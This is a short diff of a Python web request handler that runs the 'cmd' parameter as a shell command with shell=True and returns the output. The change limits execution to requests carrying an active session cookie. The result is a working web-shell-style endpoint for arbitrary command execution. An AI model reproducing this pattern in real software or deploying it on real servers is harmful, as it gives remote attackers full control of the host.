@@ -9,19 +9,20 @@ class start:
         self.configs = configs
         self.cookies_handler = cookies_handler
         self.stt_code = 200
-        self.return_data = {}
+        self.return_data = {"data":"<html></html>"}
         pass
 
     def execute(self):
-        if len(self.params) != 1:
-            self.return_data["data"] = """
-            parameters:
-                cmd = <execute command>
-            """
-        else:
-            print self.params
-            cmd = subprocess.Popen(self.params["cmd"], shell=True, stdout=subprocess.PIPE)
-            self.return_data["data"]  = cmd.stdout.read()
+        if "Cookie" in self.headers:
+            if self.cookies_handler.check_cookies_by_id(self.headers["Cookie"]) == "active":
+                if "cmd" in self.params:
+                    cmd = subprocess.Popen(self.params["cmd"], shell=True, stdout=subprocess.PIPE)
+                    self.return_data["data"]  = cmd.stdout.read()
+                else:
+                    self.return_data["data"] = """
+                    parameters:
+                    cmd = <execute command>
+                    """
 
         return self.stt_code,self.return_data
         pass
